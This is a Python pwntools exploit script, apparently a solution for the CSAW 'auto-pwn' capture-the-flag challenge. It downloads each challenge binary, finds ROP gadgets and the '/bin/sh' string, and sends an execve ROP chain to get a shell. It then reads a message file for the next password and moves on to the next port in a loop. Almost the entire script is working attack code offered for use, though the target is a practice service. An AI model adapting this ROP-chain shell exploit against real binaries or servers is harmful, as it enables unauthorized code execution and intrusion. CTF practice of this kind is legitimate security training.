import os
from pwn import *

def findGadget(f,gadget):
    payload = f'~/bin/rp++ -f {f} -r 1| sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g"|grep --color=never "{gadget}"|awk \'NR==1{{print $1; exit}}\'|rev|cut -c2-|rev|sed -r \'s/\x1b\[[0-9;]*m//g\''
    gadget = os.popen(payload).read()
    gadget = int(gadget,16)
    return gadget

def findString(f,str):
    payload = f'strings -tx {f} |grep /bin/sh|awk \'NR==1{{print $1; exit}}\''
    str = "0x"+os.popen(payload).read()
    str = int(str,16)
    return str

def saveBinary(binary,filename):
    binary = binary.decode('utf-8')
    with open(f'{filename}_1.txt','w') as f:
        f.write(binary)
        f.close()

    os.popen(f'xxd -r {filename}_1.txt > {filename}').read()
    os.popen(f'chmod +x {filename}').read()

def createROPChain(f,pie_base):
    L_pop_rdi = pie_base + findGadget(f,"pop rdi")
    L_pop_rsi = pie_base + findGadget(f,"pop rsi")
    L_pop_rdx = pie_base + findGadget(f,"pop rdx")
    L_pop_rax = pie_base + findGadget(f,"pop rax")
    L_syscall = pie_base + findGadget(f, "syscall")

    L_ROP = [
    	b'A'*0x1,
	L_pop_rdi, L_pop_rdi, pie_base + findString(f,'/bin/sh'),
	L_pop_rsi, 0,
	L_pop_rdx, 0,
	L_pop_rax, 0x3b,
	L_syscall
    ]

    return L_ROP

def startBin(ip,port,password,num):
    io = remote(ip,port)
    libc = ELF('./libc-2.24.so')
    io.recvuntil('>')
    io.sendline(password)
    io.recvuntil('-------------------------------------------------------------------')
    binary = io.recvuntil('-------------------------------------------------------------------')

    f="binary_"+str(num)
    saveBinary(binary,f)

    io.interactive()
    
    io.recvuntil('Main is at ')
    pie_base = int(b'0x' + io.recvline().strip(),0) - 0x1421
    print(f'Pie @ {hex(pie_base)}')

    L_ROP = createROPChain(f,pie_base)
    io.sendline(flat(L_ROP,arch='amd64'))
    io.sendline('cat message.txt')
    msg = io.recvline()
    saveMsg(msg,num)
    io.close()

def saveMsg(msg,num):
    msg = msg.decode('utf-8')
    print(msg)
    with open(f"message_{num}.txt",'w') as f:
        f.write(msg)
        f.close()

def getNextPassword(num):
    password = ""
    with open(f"message_{num}.txt","r") as f:
        password = f.read()
        f.close()

    password = password.strip()
    password = password.split(' ')[-1]
    return password

if __name__=="__main__":
    #password = '8d16635db965bc4e0a97521e8105fad2'
    password = '13462b403d91edd8c8389517c1eca3ed'
    num = 21
    port = 11021

    while True:
        startBin('auto-pwn.chal.csaw.io',port,password,num)
        password = getNextPassword(num)
        num+=1
        port+=1
